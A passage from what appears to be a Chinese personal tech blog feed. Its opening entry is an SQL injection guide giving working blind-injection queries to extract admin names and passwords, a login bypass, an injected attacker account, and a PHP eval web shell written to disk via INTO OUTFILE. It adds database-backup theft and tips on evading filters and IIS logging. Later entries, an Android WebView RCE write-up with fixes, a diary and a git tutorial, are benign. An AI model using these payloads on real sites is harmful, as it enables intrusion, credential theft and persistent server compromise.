and 1=(select count(*)</span> <span class="keyword">from</span> admin <span class="keyword">where</span> len(_blank&gt;密码字段名称password)&gt;<span class="number">0</span>)
</code></pre><h4 id="4-猜解各个字段的长度">4.猜解各个字段的长度</h4><p>猜解长度就是把&gt;0变换,直到返回正确页面为止</p>
<pre><code><span class="keyword">and</span> <span class="number">1</span>=(<span class="keyword">select</span> count<span class="comment">(*) from admin where len(*)</span>&gt;<span class="number">0</span>)
<span class="keyword">and</span> <span class="number">1</span>=(<span class="keyword">select</span> count<span class="comment">(*) from admin where len(name)&gt;6) 错误
and 1=(select count(*)</span> <span class="keyword">from</span> admin <span class="keyword">where</span> len(name)&gt;<span class="number">5</span>) 正确 长度是<span class="number">6</span>
<span class="keyword">and</span> <span class="number">1</span>=(<span class="keyword">select</span> count<span class="comment">(*) from admin where len(name)=6) 正确

and 1=(select count(*)</span> <span class="keyword">from</span> admin <span class="keyword">where</span> len(password)&gt;<span class="number">11</span>) 正确
<span class="keyword">and</span> <span class="number">1</span>=(<span class="keyword">select</span> count<span class="comment">(*) from admin where len(password)&gt;12) 错误 长度是12
and 1=(select count(*)</span> <span class="keyword">from</span> admin <span class="keyword">where</span> len(password)=<span class="number">12</span>) 正确
</code></pre><h4 id="5-猜解字符">5.猜解字符</h4><pre><code><span class="keyword">and</span> <span class="number">1</span>=(<span class="keyword">select</span> count<span class="comment">(*) from admin where left(name,1)=a) —猜解用户帐号的第一位
and 1=(select count(*)</span> <span class="keyword">from</span> admin <span class="keyword">where</span> left(name,<span class="number">2</span>)=ab)—猜解用户帐号的第二位
</code></pre><p>就这样一次加一个字符这样猜,猜到够你刚才猜出来的多少位了就对了,帐号就算出来了</p>
<pre><code>and <span class="number">1</span>=<span class="list">(<span class="keyword">select</span> top <span class="number">1</span> count<span class="list">(<span class="keyword">*</span>)</span> from Admin where Asc<span class="list">(<span class="keyword">mid</span><span class="list">(<span class="keyword">pass</span>,<span class="number">5</span>,<span class="number">1</span>)</span>)</span>=51)</span>
</code></pre><p>这个查询语句可以猜解中文的用户和_blank&gt;密码.只要把后面的数字换成中文的ASSIC码就OK.最后把结果再转换成字符.</p>
<pre><code>group by users.id having 1=1
group by users.id, users.username, users.password, users.privs having 1=1
; <span class="operator"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">users</span> <span class="keyword">values</span>( <span class="number">666</span>, attacker, foobar, <span class="number">0xffff</span> )
<span class="keyword">UNION</span> <span class="keyword">Select</span> TOP <span class="number">1</span> COLUMN_blank&gt;_NAME <span class="keyword">FROM</span> INFORMATION_blank&gt;_SCHEMA.<span class="keyword">COLUMNS</span> <span class="keyword">Where</span> TABLE_blank&gt;_NAME=logintable
<span class="keyword">UNION</span> <span class="keyword">Select</span> TOP <span class="number">1</span> COLUMN_blank&gt;_NAME <span class="keyword">FROM</span> INFORMATION_blank&gt;_SCHEMA.<span class="keyword">COLUMNS</span> <span class="keyword">Where</span> TABLE_blank&gt;_NAME=logintable <span class="keyword">Where</span> COLUMN_blank&gt;_NAME <span class="keyword">NOT</span> <span class="keyword">IN</span> (login_blank&gt;_id)
<span class="keyword">UNION</span> <span class="keyword">Select</span> TOP <span class="number">1</span> COLUMN_blank&gt;_NAME <span class="keyword">FROM</span> INFORMATION_blank&gt;_SCHEMA.<span class="keyword">COLUMNS</span> <span class="keyword">Where</span> TABLE_blank&gt;_NAME=logintable <span class="keyword">Where</span> COLUMN_blank&gt;_NAME <span class="keyword">NOT</span> <span class="keyword">IN</span> (login_blank&gt;_id,login_blank&gt;_name)
<span class="keyword">UNION</span> <span class="keyword">Select</span> TOP <span class="number">1</span> login_blank&gt;_name <span class="keyword">FROM</span> logintable
<span class="keyword">UNION</span> <span class="keyword">Select</span> TOP <span class="number">1</span> <span class="keyword">password</span> <span class="keyword">FROM</span> logintable <span class="keyword">where</span> login_blank&gt;_name=Rahul</span>
</code></pre><h2 id="七-挂马">七.挂马</h2><h3 id="1-判断数据库权限">1.判断数据库权限</h3><pre><code>and <span class="function"><span class="title">ord</span><span class="params">(mid(user()</span></span>,<span class="number">1</span>,<span class="number">1</span>))=<span class="number">114</span> <span class="comment">/* 返回正常说明为root</span>
</code></pre><p><img src="http://7xi9s3.com1.z0.glb.clouddn.com/inject-7.png" alt=""><br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/inject-8.png" alt=""></p>
<h3 id="2-直接写马">2.直接写马</h3><ul>
<li>1.知道站点物理路径</li>
<li>2.有足够大的权限(如root)（可以用select …. from mysql.user测试）</li>
<li>3.magic_quotes_gpc()=OFF</li>
</ul>
<p>select 一句话 into outfile “物理路径”<br>&lt;?php @eval($_POST[‘igigt’]);?&gt; 转为16进制形式  0x3C3F70687020406576616C28245F504F53545B276967696774275D293B3F3E</p>
<pre><code>http://localhost/test/get_root.php?id=1 union select <span class="number">0x3C3F70</span><span class="number">68702040657</span><span class="number">6616C28245</span>F<span class="number">504F53545</span>B<span class="number">27696769677</span><span class="number">4275D293</span>B3F3E,2,3,4 from mysql.user into outfile "d:\igigt.php"
</code></pre><p><img src="http://7xi9s3.com1.z0.glb.clouddn.com/inject-9.png" alt=""></p>
<p>在D盘目录下即可找到一句话，然后菜刀连<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/inject-10.png" alt=""></p>
<h3 id="3-通过建临时表写马">3.通过建临时表写马</h3><pre><code>CREATE TABLE <span class="function"><span class="title">igigt</span><span class="params">(cmd text)</span></span>
INSERT INTO <span class="function"><span class="title">igigt</span><span class="params">(cmd)</span></span> <span class="function"><span class="title">VALUES</span><span class="params">(<span class="string">"&lt;?php @eval($_POST['igigt']);?&gt;"</span>)</span></span> <span class="comment">// 或(推荐0x方式)</span>
INSERT INTO <span class="function"><span class="title">igigt</span><span class="params">(cmd)</span></span> <span class="function"><span class="title">VALUES</span><span class="params">(<span class="number">0</span>x3C3F70687020406576616C28245F504F53545B276967696774275D293B3F3E)</span></span>
SELECT cmd FROM igigt into OUTFILE <span class="string">"d:\\test.php"</span>
DROP TABLE igigt
</code></pre><h3 id="4-LOAD_FILE">4.LOAD_FILE</h3><p>LOAD_FILE可以加载文件，对获取网站信息以及物理路径有很大帮助，不过同outfile一样也需要root权限</p>
<pre><code><span class="rule"><span class="attribute">http</span>:<span class="value">//localhost/test/get_root.php?id=<span class="number">1</span> union select <span class="function">LOAD_FILE</span>(<span class="string">"d:\\igigt.php"</span>)</span></span>
</code></pre><p><img src="http://7xi9s3.com1.z0.glb.clouddn.com/inject-13.png" alt=""></p>
<h3 id="5-权限不够">5.权限不够</h3><p>提权或者扫后台，解密用户名密码(一般为MD5加密)登录之后挂马</p>
<h2 id="八-其他">八.其他</h2><h3 id="1-登录弱密码">1.登录弱密码</h3><p>user:admin’ or ‘1’=’1<br>pwd:admin’ or ‘1’=’1</p>
<h3 id="2-确认数据库类型">2.确认数据库类型</h3><p>只有MYSQL解析</p>
<pre><code><span class="keyword">and</span> <span class="keyword">ord</span>(mid(version(),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">51</span>/* 确认数据库版本 <span class="number">51</span>是ASCII码<span class="number">3</span> 正确则&gt;<span class="number">4.0</span> 错误则&lt;<span class="number">4.0</span>
http://localhost/test/get.php?id=<span class="number">1</span> <span class="keyword">and</span> <span class="keyword">ord</span>(mid(version(),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">51</span>
</code></pre><p><img src="http://7xi9s3.com1.z0.glb.clouddn.com/inject-11.png" alt=""></p>
<p>两错为access 一错二对为mssql(SQLServer)</p>
<pre><code><span class="keyword">and</span> (<span class="keyword">select</span> count<span class="comment">(*) from sysobjects)&gt;0 //msysobjects为access特有 但默认无权限读取
and (select count(*)</span> <span class="keyword">from</span> msysobjects)&gt;<span class="number">0</span> <span class="comment">//sysobjects为mssql特有</span>
</code></pre><h3 id="3-操作系统信息">3.操作系统信息</h3><pre><code>and <span class="number">1</span>=<span class="number">2</span> <span class="class"><span class="keyword">union</span> <span class="title">all</span> <span class="title">select</span> @@<span class="title">global</span>.<span class="title">version_compile_os</span> <span class="title">from</span> <span class="title">mysql</span>.<span class="title">user</span></span>
</code></pre><p>访问mysql.user需要root权限<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/inject-12.png" alt=""></p>
<h3 id="4-利用内置变量">4.利用内置变量</h3><pre><code><span class="rule"><span class="attribute">http</span>:<span class="value">//www.mytest.com/showdetail.asp?id=<span class="number">49</span> </span></span>;<span class="tag">and</span> <span class="tag">user</span>&gt;0
</code></pre><p>user是SQLServer的一个内置变量，它的值是当前连接的用户名，类型为 nvarchar。<br>拿一个 nvarchar 的值跟 int 的数 0 比较，系统会先试图将 nvarchar 的值转成 int 型，<br>当然，转的过程中肯定会出错，SQLServer 的出错提示是：将 nvarchar 值 ”abc” 转换数据类型为 int 的列时发生语法错误，<br>abc 正是变量 user 的值，这样，不废吹灰之力就拿到了数据库的用户名。</p>
<p>类似的例子and user&gt;0，作用是获取连接用户名，db_name()是另一个系统变量，返回的是连接的数据库名。</p>
<h3 id="5-下载网站备份文件">5.下载网站备份文件</h3><pre><code>http://Site/url.asp?id=1;<span class="operator"><span class="keyword">backup</span> <span class="keyword">database</span> 数据库名 <span class="keyword">to</span> disk=’<span class="keyword">c</span>:\\inetpub\\wwwroot1.db’;</span><span class="comment">--</span>
</code></pre><p>拿到的数据库名，加上某些 IIS 出错暴露出的绝对路径，将数据库备份到 Web 目录下面，再用 HTTP 把整个数据库就完完整整的下载回来，所有的管理员及用户密码都一览无遗！<br>或者也可以尝试扫描整个网站目录，也有机会下载到网站备份文件。</p>
<h3 id="6-经验小结">6.经验小结</h3><p>1.有些人会过滤 Select、Update、Delete 这些关键字，但偏偏忘记区分大小写，所以大家可以用 selecT 这样尝试一下。<br>2.在猜不到字段名时，不妨看看网站上的登录表单，一般为了方便起见，字段名都与表单的输入框取相同的名字。<br>3.地址栏的+号传入程序后解释为空格，%2B 解释为 + 号，%25 解释为 % 号，具体可以参考 URLEncode 的相关介绍。<br>4.用Get方法注入时，IIS会记录你所有的提交字符串，对 Post 方法做则不记录，所以能用 Post 的网址尽量不用Get。<br>5.猜解Access时只能用Ascii逐字解码法，SQLServer也可以用这种方法，只需要两者之间的区别即可，但是如果能用 SQLServer 的报错信息把值暴露出来，那效率和准确率会有极大的提高。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>SQL注入测试思路整理</p>
<h2 id="一-搜索可能有漏洞的网站">一.搜索可能有漏洞的网站</h2><p>利用google收集信息，可以搜索的关键词很多，网上有个术语，把这些称作“Google Dorks”</p>
<pre><code><span class="]]>
    </summary>
    
      <category term="sql" scheme="http://blog.idhyt.com/tags/sql/"/>
    
      <category term="technic" scheme="http://blog.idhyt.com/categories/technic/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[WebView组件远程代码执行漏洞]]></title>
    <link href="http://blog.idhyt.com/2015/04/09/android-abusing-webview/"/>
    <id>http://blog.idhyt.com/2015/04/09/android-abusing-webview/</id>
    <published>2015-04-09T03:30:21.000Z</published>
    <updated>2015-04-11T03:11:11.000Z</updated>
    <content type="html"><![CDATA[<p>&#160; &#160; &#160; &#160;在android的sdk中封装了webView控件,在webView下有一个非常特殊的接口函数addJavascriptInterface,利用这个接口函数可实现穿透webkit控制android 本机。</p>
<h3 id="简介">简介</h3><p>&#160; &#160; &#160; &#160;Webview是Android用于浏览网页的组件，它的接口函数addJavascriptInterface可以实现网页JS与本地JAVA的交互，但是没有限制已注册JAVA类的方法调用，导致可以利用反射机制调用未注册的其它任何JAVA类。当Android用户访问恶意网页时，会被迫执行系统命令，如安装木马、盗取敏感数据等。</p>
<h3 id="漏洞详情">漏洞详情</h3><p>构建一个使用Webview组件的程序</p>
<h4 id="1-_AndroidManifest-xml添加网络访问权限">1. AndroidManifest.xml添加网络访问权限</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">uses-permission</span> <span class="attribute">android:name</span>=<span class="value">"android.permission.INTERNET"</span>/&gt;</span></span><br></pre></td></tr></table></figure>
<p><br></p>
<h4 id="2-_activity_my-xml添加Webview控件">2. activity_my.xml添加Webview控件</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">WebView</span></span><br><span class="line">     <span class="attribute">android:layout_width</span>=<span class="value">"wrap_content"</span></span><br><span class="line">     <span class="attribute">android:layout_height</span>=<span class="value">"wrap_content"</span></span><br><span class="line">     <span class="attribute">android:id</span>=<span class="value">"@+id/webView"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="title">WebView</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="3-_MainActivity-java添加关键代码">3. MainActivity.java添加关键代码</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">    setContentView(R.layout.activity_main);</span><br><span class="line">    <span class="comment">// add webview func</span></span><br><span class="line">    WebView webview = (WebView)findViewById(R.id.webView);</span><br><span class="line">    webview.getSettings().setJavaScriptEnabled(<span class="keyword">true</span>);</span><br><span class="line">    webview.loadUrl(<span class="string">"http://info.idhyt.xyz/vultest/checkwebview.html"</span>);<span class="string">");</span></span><br></pre></td></tr></table></figure>
<p><br></p>
<h4 id="4-_测试页面">4. 测试页面</h4><p>&#160; &#160; &#160; &#160;<a href="http://idhyt.sinaapp.com/vultest/checkwebview.html" target="_blank" rel="external">webview漏洞测试页面</a><br>&#160; &#160; &#160; &#160;<a href="http://idhyt.sinaapp.com/vultest/webviewexp.html" target="_blank" rel="external">webview漏洞利用页面</a><br><br></p>
<h4 id="5-_测试结果">5. 测试结果</h4><p>&#160; &#160; &#160; &#160;在没有使用addJavascriptInterface接口函数的情况下，<br>也会存在远程代码执行漏洞，原因是webview组件默认调用”searchBoxJavaBridge_”对象。<br>&#160; &#160; &#160; &#160;<img src="http://7xi9s3.com1.z0.glb.clouddn.com/webview-1.png" alt=""></p>
<p>&#160; &#160; &#160; &#160;当使用addJavascriptInterface接口函数时，代码改为<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">WebView webview = (WebView)findViewById(R.id.webView);</span><br><span class="line">webview.getSettings().setJavaScriptEnabled(<span class="keyword">true</span>);</span><br><span class="line">webview.getSettings().setJavaScriptCanOpenWindowsAutomatically(<span class="keyword">true</span>);</span><br><span class="line">webview.addJavascriptInterface(<span class="keyword">new</span> test(), <span class="string">"test"</span>);</span><br><span class="line">webview.loadUrl(<span class="string">"http://info.idhyt.xyz/vultest/checkwebview.html"</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="comment">//do something...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>&#160; &#160; &#160; &#160;测试结果<br>&#160; &#160; &#160; &#160;<img src="http://7xi9s3.com1.z0.glb.clouddn.com/webview-2.png" alt=""></p>
<p>&#160; &#160; &#160; &#160;可以看到，即便test类没有具体实现代码，也一样会触发漏洞。<br><br></p>
<h3 id="漏洞检测">漏洞检测</h3><p>&#160; &#160; &#160; &#160;通过编写静态扫描器过滤出可能存在问题的apk，方法是通过apktool将apk文件反编译成smali,之后进行暴力搜索关键字。<br>&#160; &#160; &#160; &#160;<img src="http://7xi9s3.com1.z0.glb.clouddn.com/webview-3.png" alt=""><br><br><br>其中用到的几个关键的正则:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">获取类名</span><br><span class="line"><span class="string">r"^\.class.+(Lcom.+);"</span></span><br><span class="line">获取所有method</span><br><span class="line"><span class="string">r"(\.method[\s\S]*?\.end *method)"</span></span><br><span class="line">获取method方法类型</span><br><span class="line"><span class="string">r"^\.method.+ +(\w+) *\("</span></span><br><span class="line">获取method中的.line</span><br><span class="line"><span class="string">r"\.line([\s\S]*?)(?=(\.line))"</span></span><br><span class="line">获取指定的调用函数</span><br><span class="line"><span class="string">r"setJavaScriptEnabled|addJavascriptInterface"</span></span><br></pre></td></tr></table></figure></p>
<h3 id="防范">防范</h3><ul>
<li>使用removeJavascriptInterface(“searchBoxJavaBridge<em>“)移除searchBoxJavaBridge</em>对象<br>1.重构WebView控件(WebViewEx)</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.idhyt.webview;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> android.os.Build;</span><br><span class="line"><span class="keyword">import</span> android.util.AttributeSet;</span><br><span class="line"><span class="keyword">import</span> android.webkit.WebView;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span><br><span class="line"> * Created by idhyt on 2015/4/28.</span><br><span class="line"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WebViewEx</span> <span class="keyword">extends</span> <span class="title">WebView</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">WebViewEx</span><span class="params">(Context context, AttributeSet attrs)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(context, attrs);</span><br><span class="line">        <span class="comment">// TODO Auto-generated constructor stub</span></span><br><span class="line">        <span class="keyword">if</span> (Build.VERSION.SDK_INT &gt; <span class="number">10</span> &amp;&amp; Build.VERSION.SDK_INT &lt; <span class="number">17</span>) &#123;</span><br><span class="line">            removeJavascriptInterface(<span class="string">"searchBoxJavaBridge_"</span>);</span><br><span class="line">            <span class="comment">// removeJavascriptInterface("accessibility");</span></span><br><span class="line">            <span class="comment">// removeJavascriptInterface("accessibilityTraversal");</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>2.修改系统解析XML中定义的属性回调方法(layout\activity_main.xml中<webview>)</webview></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">com.example.idhyt.webview.WebViewEx</span></span><br><span class="line">    <span class="attribute">android:layout_width</span>=<span class="value">"wrap_content"</span></span><br><span class="line">    <span class="attribute">android:layout_height</span>=<span class="value">"wrap_content"</span></span><br><span class="line">    <span class="attribute">android:id</span>=<span class="value">"@+id/webView"</span> /&gt;</span></span><br></pre></td></tr></table></figure>
<p>3.调用WebViewEx控件</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">ActionBarActivity</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="annotation">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">    setContentView(R.layout.activity_main);</span><br><span class="line">    WebViewEx webview = (WebViewEx)findViewById(R.id.webView);</span><br><span class="line">    webview.getSettings().setJavaScriptEnabled(<span class="keyword">true</span>);</span><br><span class="line">    webview.loadUrl(<span class="string">"http://info.idhyt.xyz/vultest/checkwebview.html"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// other function</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>确保只在访问可信页面数据时才使用addjavascriptInterface。 </li>
<li>在调用Java对象方法前对参数进行检查，避免执行恶意操作。</li>
<li>对于在4.2(API 17+)系统运行的应用，使用JavascriptInterface代替addjavascriptInterface。</li>
<li>限制对于该接口的使用来源，只允许可信来源访问该接口。例如使用WebViewClient中的shouldOverrideUrlLoading()来对加载的URL进行检查。</li>
</ul>
<h3 id="参考">参考</h3><ol>
<li><a href="http://50.56.33.56/blog/?p=314" target="_blank" rel="external">Abusing WebView JavaScript Bridges</a></li>
<li><a href="http://drops.wooyun.org/papers/548" target="_blank" rel="external">WebView中接口隐患与手机挂马利用</a></li>
<li><a href="http://blog.csdn.net/leehong2005/article/details/11808557" target="_blank" rel="external">Android WebView的Js对象注入漏洞解决方案</a></li>
</ol>
]]></content>
    <summary type="html">
    <![CDATA[<p>&#160; &#160; &#160; &#160;在android的sdk中封装了webView控件,在webView下有一个非常特殊的接口函数addJavascriptInterface,利用这个接口函数可实现穿透webkit控制android 本机。</p>
<h3]]>
    </summary>
    
      <category term="webview" scheme="http://blog.idhyt.com/tags/webview/"/>
    
      <category term="android" scheme="http://blog.idhyt.com/categories/android/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[无法描述]]></title>
    <link href="http://blog.idhyt.com/2015/03/23/diary-essay-record/"/>
    <id>http://blog.idhyt.com/2015/03/23/diary-essay-record/</id>
    <published>2015-03-23T13:46:33.000Z</published>
    <updated>2015-12-31T11:46:30.000Z</updated>
    <content type="html"><![CDATA[<ul>
<li><p>世界上最美的情话是，我喜欢的人，它正好也喜欢我<a id="more"></a><br>那最不美的呢<br>它特么的竟然在骗我 :)</p>
</li>
<li><p>其实我内心是一个没有太多梦想的人，有点懒，爱玩，定力不足，喜欢靠点小聪明安于现状，侥幸能走到现在我已很意外。不喜欢有压力，不习惯别人对我报太大期望，让人失望，那种感觉很不好，是不是我们心里都有一种拿人钱财替人消灾的愧疚感。。</p>
</li>
<li><p>这一生有很多再见，是再也不见；这一世有很多相遇，是不期而遇。人生的奇妙，只在无常。</p>
</li>
<li><p>圈养的羡慕放养的自由，放养的羡慕圈养的安稳。有想法一定要去尝试，不要让想法成为空谈的资本。把尝试当成任务，而不是间歇的测试，不要让尝试成为拖延的借口。回头看看之前发的状态，经常温习一下过去的安逸的日子，你会发现。我都不明白我在讲什么了。总之，还很菜。</p>
</li>
<li><p>世界上有完美的人和事吗？只展现好的一面就一定是好人吗？因为假，所以看起来很完美；因为真，所以看起来才不那么完美。很简单的道理，可是很多人却不懂。宁愿相信假的美好，也不敢面对不完美的真实。</p>
</li>
<li><p>我们总认为大脑是人体最聪明的器官，但是你再想想，这个判断是大脑自己做出的。</p>
</li>
<li><p>有种现象叫“薛定谔的滚”，即当一个妹子叫你滚的时候，你永远不知道她是在叫你滚还是叫你过来抱紧。 此时的你应该处于一种又抱又滚的量子力学状态，解出该波函数以得知在平行世界你被踹翻还是被抱紧的概率多少关键是：看脸。</p>
</li>
<li><p>人生若只如初见，何事秋风悲画扇？等闲变却故人心，却道故人心易变。</p>
</li>
<li><p>世界上最遥远的距离，是我在if里你在else里，似乎一直相伴又永远分离；世界上最痴心的等待，是我当case你是switch，或许永远都选不上自己；世界上最真情的相依，是你在try我在catch，无论你发神马脾气，我都默默承受，静静处理，到那时，再来期待我们的finally，或者，崩溃退出</p>
</li>
<li><p>早安，生活中遇到傻逼怎么办？支持他一切，把他培养成大傻逼</p>
</li>
<li><p>所谓生活的滋味不一定是在你住在高级酒店的一刻，也不一定都是你一览众山小时的感慨，而是我们乏味似水的时时刻刻</p>
</li>
<li><p>你们用盗版的时候有想过做出这款软件的程序员吗？！他们该如何养家糊口？哈哈哈，别逗了，程序员哪有家要养啊！</p>
</li>
<li><p>我个子矮怎么了，我捡钱速度比你快</p>
</li>
<li><p>我喜欢你 别说你做过鸭 就算你杀人了 我也是会帮你藏尸的那个人</p>
</li>
<li><p>人都他妈是一边傻一边成长，真的</p>
</li>
</ul>
]]></content>
    <summary type="html">
    <![CDATA[<ul>
<li><p>世界上最美的情话是，我喜欢的人，它正好也喜欢我]]>
    
    </summary>
    
      <category term="无法描述" scheme="http://blog.idhyt.com/tags/%E6%97%A0%E6%B3%95%E6%8F%8F%E8%BF%B0/"/>
    
      <category term="diary" scheme="http://blog.idhyt.com/categories/diary/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[git使用总结]]></title>
    <link href="http://blog.idhyt.com/2015/01/16/technic-git-conclusion/"/>
    <id>http://blog.idhyt.com/2015/01/16/technic-git-conclusion/</id>
    <published>2015-01-16T13:46:33.000Z</published>
    <updated>2015-12-31T11:52:09.000Z</updated>
    <content type="html"><![CDATA[<p>windows下git使用总结</p>
<h3 id="初始化配置Github">初始化配置Github</h3><ol>
<li><p>下载msysgit并安装 : <a href="http://msysgit.github.io/" target="_blank" rel="external">http://msysgit.github.io/</a></p>
</li>
<li><p>github上创建一个项目，如SmartScript</p>
</li>
<li><p>初始化<br> 新建Github目录并进入：cd d:\work\Github<br> git init<br> git config –global user.name “usernme” （username：GitHub的用户名）<br> git config –global user.email  “emailName” （emailName：GitHub的注册邮箱）</p>
</li>
<li><p>安装ssh<br> 4.1 检查SSH公钥 : cd ~/.ssh 看看存不存在.ssh</p>
<p> 4.2 生成SSH公钥 : ssh-keygen -t rsa -C “your_email@youremail.com”</p>
<pre><code><span class="comment"># Creates a new ssh key using the provided email Generating public/private rsa key pair.</span>
Enter <span class="built_in">file</span> <span class="operator">in</span> which <span class="built_in">to</span> save <span class="operator">the</span> key (/user/you/.ssh/id_rsa):
</code></pre><p> 现在你可以看到，在自己的目录下，有一个.ssh目录，说明成功了</p>
<p> 4.3 输入github密码</p>
<pre><code>Enter passphrase (<span class="keyword">empty</span> <span class="keyword">for</span> no passphrase): [<span class="keyword">Type</span> a passphrase]
Enter same passphrase again: [<span class="keyword">Type</span> passphrase again]
这个时候输入你在github密码。
然后在.ssh中可以看到
Your identification <span class="keyword">has</span> been saved <span class="keyword">in</span> /home/you/.ssh/id_rsa.
# Your <span class="keyword">public</span> key <span class="keyword">has</span> been saved <span class="keyword">in</span> /home/you/.ssh/id_rsa.pub.
</code></pre><p> 4.4 添加SSH公钥到github</p>
<pre><code>打开<span class="tag">github</span>，找到账户里面添加<span class="tag">SSH</span>，把<span class="tag">idrsa</span><span class="class">.pub</span>内容复制到<span class="tag">key</span>里面。
</code></pre><p> 4.5 测试是否生效</p>
<pre><code>使用命令： ssh -T git@github.com
当你看到这些内容放入时候，直接yes
The authenticity of host 'github.com (207.97.227.239)' can't be established.
RSA key fingerprint is 16:27:ac:a5:76:28:2d:36:63:1b:56:4d:eb:df:a6:48.
Are you sure you want to continue connecting (yes/no)?
看到这个内容放入时候，说明就成功了。
![<span class="link_label">tool-editor</span>](<span class="link_url">http://7xi9s3.com1.z0.glb.clouddn.com/git-conclusion-1.png</span>)
</code></pre></li>
<li><p>使用git add filename 将项目文件添加到库（如 git add “readme.txt”）<br> 也可以多文件夹设置，如在Github目录下创建文件夹Python并拷贝项目到该目录，然后CD 进入执行命令</p>
</li>
<li><p>使用git commit -m “first commit” 进行提交（”first commit” 相当于一个描述）</p>
</li>
<li><p>使用远程连接：git remote add origin git@github.com:username/SmartScript.git （username：GitHub上的用户名，SmartScript：我在GitHub上创建的仓库repository名）</p>
</li>
<li><p>输入命令“git push origin master”将源码推送到GitHub</p>
</li>
<li><p>在GitHub上仓库页面刷新即可看到你在本地创建并提交的文件</p>
</li>
</ol>
<h3 id="删除Github上的文件(如_del-txt)">删除Github上的文件(如 del.txt)</h3><ol>
<li>进入到对应的目录下 cd: D:\work\Github\SmartScript</li>
<li>git rm –cached ”del.txt”</li>
<li>git commit -m “del”</li>
<li>git push origin master (失败先 git pull)<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/git-conclusion-2.png" alt="tool-editor"></li>
<li>另外<br> 使用 git rm 命令即可，有两种选择,<br> 一种是 git rm –cached “文件路径”，不删除物理文件，仅将该文件从缓存中删除；<br> 一种是 git rm –f “文件路径”，不仅将该文件从缓存中删除，还会将物理文件删除（不会回收到垃圾桶）。<br> 如果删除文件夹，需要加-r参数<br> 如： git rm –f -r “文件夹名”</li>
</ol>
